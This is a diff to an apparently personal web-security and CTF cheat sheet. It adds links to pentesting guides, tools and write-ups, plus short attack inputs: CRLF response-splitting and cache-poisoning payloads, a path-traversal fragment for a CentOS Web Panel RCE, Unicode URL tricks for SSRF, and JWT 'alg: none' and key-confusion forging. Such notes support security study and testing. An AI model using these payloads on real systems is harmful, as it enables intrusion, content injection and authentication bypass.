@@ -40,6 +40,8 @@
 
 # Information Disclosure
 
+- [Dangling Markup \- HTML scriptless injection \- HackTricks](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)
+    - [Postcards from the post\-XSS world](https://lcamtuf.coredump.cx/postxss/)
 - [GitHub \- cure53/HTTPLeaks: HTTPLeaks \- All possible ways, a website can leak HTTP requests](https://github.com/cure53/HTTPLeaks)
 
 - [Webhook\.site \- Test, process and transform emails and HTTP requests](https://webhook.site/)
@@ -57,7 +59,7 @@ if _name__ == "__main__":
     app.run(host='0.0.0.0', port=80, debug=True, threaded=True)
 ```
 
-- robots.txt
+- robots.txt, sitemap.xml
 - web server
     - e.g. nginx => `gixy /etc/nginx/nginx.conf`
         - https://github.com/8ayac/blog.8ay.ac/blob/ebc933c73dba0a5c98264cecee8c2e728dd7dad7/docs/articles/2020-03-21_LINE%20CTF%202021%20Writeup%20(%5BWeb%5D%20diveinternal%2C%20Your%20Note)%20-%20%5BEnglish%5D/index.md
@@ -91,14 +93,22 @@ if _name__ == "__main__":
     ```
 - response status codes
     - e.g. 403 for registered users and 404 for invalid users
+    - https://book.hacktricks.xyz/pentesting/pentesting-web/403-and-401-bypasses
 - parameter pollution
     1. search?q=foo
     2. search?q=bar
     3. search?q=foo&q=bar (distinct result from previous cases)
+    4. search?q[]=foo&q[]=bar
+        - https://github.com/csivitu/CTF-Write-ups/tree/master/redpwnCTF%202020/web/tux-fanpage#tux-fanpage
+        - https://gist.github.com/officialaimm/777b632be51998117e43eff71a5146f3#pasteurize
 - ssl strip
     - mitigations: Strict-Transport-Security (HSTS)
         - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+- ssl weak encryption
+    - https://github.com/drwetter/testssl.sh
+    - https://github.com/hahwul/a2sv
 
+- https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology
 - https://medium.com/@muratkaraoz/web-app-pentest-cheat-sheet-c17394af773
 
 ### referrer
@@ -189,6 +199,7 @@ Clone:
 # Cross-Site Request Forgery (CSRF)
 
 - https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery
+- https://www.icir.org/vern/cs161-sp17/notes/CSRF_Paper.pdf
 
 - Server validates that form request was sent with same CSRF token in user session
     - Extracting token: hardcoded in input / included by js
@@ -458,6 +469,8 @@ sys.stdout.buffer.write(bytes(str(hex(len(o)-7))[2:], "ascii") + b"\r\n" + o)' ~
 - writing arbitrary files
     - [extraction path](./forensics.md#extraction-path)
 
+- [CVE\-2021\-45467: CWP CentOS Web Panel &\#8211; preauth RCE &\#8211; Blog \| Octagon Networks](https://octagon.net/blog/2022/01/22/cve-2021-45467-cwp-centos-web-panel-preauth-rce/)
+    - `.%00./`
 - [Directory Traversal in st | Snyk \- Open Source Security](https://snyk.io/vuln/SNYK-JS-MINHTTPSERVER-608658)
     - https://blog.npmjs.org/post/80277229932/newly-paranoid-maintainers
     - ~/Downloads/st-20140206_0_0_6b54ce2d2fb912eadd31e2c25c65456d2c8666e1.patch
@@ -864,6 +877,8 @@ nginx:
 - detection, testing
     - https://regex101.com/
     - https://github.com/cujanovic/Open-Redirect-Payloads
+    - https://nmap.org/nsedoc/scripts/http-waf-detect.html
+    - https://github.com/EnableSecurity/wafw00f
     ```
     /?q='oorr''=''%23
     /?q='oorr/**/1=1/**/%23
@@ -882,6 +897,8 @@ nginx:
 - alternative for function call
     - https://www.sigflag.at/blog/2020/writeup-angstromctf2020-caasio/
         ```javascript
+        (window?.a)``
+        window.a?.()
         window["a"]()
         window["a"].apply(null, [1, 2, 3])
         // typeof o = "string"
@@ -1009,13 +1026,34 @@ nginx:
         11100000 10110100 10001010
         ```
 - HTTP Path Normalization, IDNA
-    ```
-    http://nginx：80/flag.php
-    http://＠nginx/flag.php
-    http://nginx／flag.php
-    http://a:.@✊nginx:80.:/flag.php
-    // ACE = http://a:.xn--@nginx:80-5s4f.:/flag.php
-    ```
+    - e.g.
+        ```
+        http://nginx：80/flag.php
+        http://＠nginx/flag.php
+        http://nginx／flag.php
+        http://a:.@✊nginx:80.:/flag.php
+        // ACE = http://a:.xn--@nginx:80-5s4f.:/flag.php
+        /foo?ɋ=bar (%C9%8B)
+        'ß'.toUpperCase() === 'SS'
+        ```
+    - [CTFtime\.org / BambooFox CTF 2021 / SSRFrog / Writeup](https://ctftime.org/writeup/25763)
+        ```javascript
+        function findVariants(targetChar) {
+            let targetHost = 'fake' + targetChar + '.com';
+            for (i = 32; i <= 65535; i++) {
+                let candidateChar = String.fromCharCode(i);
+                let input = 'http://fake' + candidateChar + '.com';
+                try {
+                    let url = new URL(input);
+                    if (url.hostname === targetHost) {
+                        console.log(targetChar, ':', i, candidateChar);
+                    }
+                }
+                catch(e) {
+                }
+            }
+        }
+        ```
 - Back slashes interpreted as forward slashes
     - https://samcurry.net/abusing-http-path-normalization-and-cache-poisoning-to-steal-rocket-league-accounts/
     ```
@@ -1033,8 +1071,15 @@ nginx:
     ```
 - DNS tunnel
     - https://github.com/iagox86/dnscat2
+- HTTP splitting
+    ```
+    language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
+    ```
 - cache poisoning
     - https://owasp.org/www-community/attacks/Cache_Poisoning
+    ```
+    language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20304%20Not%20Modified%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
+    ```
 - https://haboob.sa/ctf/nullcon-2019/babyJs.html
     - [Breakout in v3\.6\.9 · Issue \#186 · patriksimek/vm2 · GitHub](https://github.com/patriksimek/vm2/issues/186)
     - [Escaping the vm sandbox · Issue \#32 · patriksimek/vm2 · GitHub](https://github.com/patriksimek/vm2/issues/32)
@@ -1067,6 +1112,14 @@ done 2>/dev/null | vim -
 ### case studies
 
 - [ModSecurity: Documentation](https://modsecurity.org/documentation.html)
+
+# JSON Web Tokens
+
+- [JSON Web Tokens \- jwt\.io](https://jwt.io/)
+- [GitHub \- ticarpi/jwt\_tool: A toolkit for testing, tweaking and cracking JSON Web Tokens](https://github.com/ticarpi/jwt_tool)
+- [Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
+    - modify signature verification function: `"alg": "none"`
+    - if a server is expecting a token signed with RSA, but actually receives a token signed with HMAC, it will think the public key is actually an HMAC secret key: `forgedToken = sign(tokenPayload, 'HS256', serverRSAPublicKey)`
 
 # wasm
 
